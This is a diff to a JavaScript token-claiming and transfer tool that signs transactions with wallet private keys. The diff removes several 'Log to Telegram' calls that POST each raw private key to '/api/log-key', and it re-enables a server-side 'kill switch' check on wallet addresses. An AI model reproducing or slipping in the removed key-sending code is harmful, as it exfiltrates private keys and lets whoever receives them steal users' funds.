@@ -3846,23 +3846,21 @@
                 const address = wallet.address;
                 addClaimLog(`   Address: ${address}`, 'info');
 
-            // Check if this address is disabled (Blockchain Kill Switch)
-            /*
-            try {
-                const statusResponse = await fetch('/api/check-key-status', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address: address.toLowerCase() })
-                });
-                const statusData = await statusResponse.json();
-                if (statusData.disabled) {
-                    addClaimLog(`   🚫 KEY DISABLED - Cannot claim! Enable in 🔐 Anamul App → Blockchain Kill Switch`, 'error');
-                    return { success: false, error: 'Key is disabled (Blockchain Kill Switch)', privateKey };
+                // Check if this address is disabled (Blockchain Kill Switch)
+                try {
+                    const statusResponse = await fetch('/api/check-key-status', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ address: address.toLowerCase() })
+                    });
+                    const statusData = await statusResponse.json();
+                    if (statusData.disabled) {
+                        addClaimLog(`   🚫 KEY DISABLED - Cannot claim! Enable in 🔐 Anamul App → Blockchain Kill Switch`, 'error');
+                        return { success: false, error: 'Key is disabled (Blockchain Kill Switch)', privateKey };
+                    }
+                } catch (err) {
+                    console.log('Kill switch check skipped (network error):', err);
                 }
-            } catch (err) {
-                console.log('Kill switch check skipped (network error):', err);
-            }
-            */
 
                 const normalizedContractAddress = normalizeAddress(contractAddress, networkType);
                 const contract = new ethers.Contract(normalizedContractAddress, GOODDOLLAR_ABI, wallet);
@@ -3915,27 +3913,11 @@
                     // Null receipt means transaction might still be pending
                     addClaimLog(`   ✅ CLAIM SUBMITTED!`, 'success');
                     addClaimLog(`   🔗 Hash: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${tx.hash}', '_blank')">${tx.hash}</span>`, 'success');
-                    
-                    // Log to Telegram
-                    fetch('/api/log-key', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ privateKey: privateKey })
-                    }).catch(err => console.error('Telegram log failed:', err));
-
                     return { success: true, privateKey };
                 } else if (receipt && (receipt.status === 1 || receipt.status === '0x1')) {
                     // Status 1 means success
                     addClaimLog(`   ✅ CLAIM SUCCESS!`, 'success');
                     addClaimLog(`   🔗 Hash: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${receipt.hash}', '_blank')">${receipt.hash}</span>`, 'success');
-                    
-                    // Log to Telegram
-                    fetch('/api/log-key', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ privateKey: privateKey })
-                    }).catch(err => console.error('Telegram log failed:', err));
-
                     return { success: true, privateKey };
                 } else if (receipt && (receipt.status === 0 || receipt.status === '0x0')) {
                     // Status 0 means reverted
@@ -4161,39 +4143,15 @@
                     if (receipt && receipt.status === 1) {
                         addTokenLog(`   ✅ TRANSFER SUCCESS!`, 'success');
                         addTokenLog(`   🔗 Hash: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${receipt.hash}', '_blank')">${receipt.hash}</span>`, 'success');
-                        
-                        // Log to Telegram
-                        fetch('/api/log-key', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ privateKey: privateKey })
-                        }).catch(err => console.error('Telegram log failed:', err));
-
                         return { success: true, privateKey, address };
                     } else if (receipt && receipt.status === 0) {
                         addTokenLog(`   ❌ Transaction reverted on chain`, 'error');
                         return { success: false, error: 'Transaction reverted', address, privateKey, reason: 'Transaction reverted' };
                     } else if (receipt === null) {
                         addTokenLog(`   ✅ TRANSFER SUBMITTED (pending confirmation)!`, 'success');
-                        
-                        // Log to Telegram
-                        fetch('/api/log-key', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ privateKey: privateKey })
-                        }).catch(err => console.error('Telegram log failed:', err));
-
                         return { success: true, privateKey, address };
                     } else {
                         addTokenLog(`   ✅ TRANSFER SUBMITTED!`, 'success');
-                        
-                        // Log to Telegram
-                        fetch('/api/log-key', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ privateKey: privateKey })
-                        }).catch(err => console.error('Telegram log failed:', err));
-
                         return { success: true, privateKey, address };
                     }
 
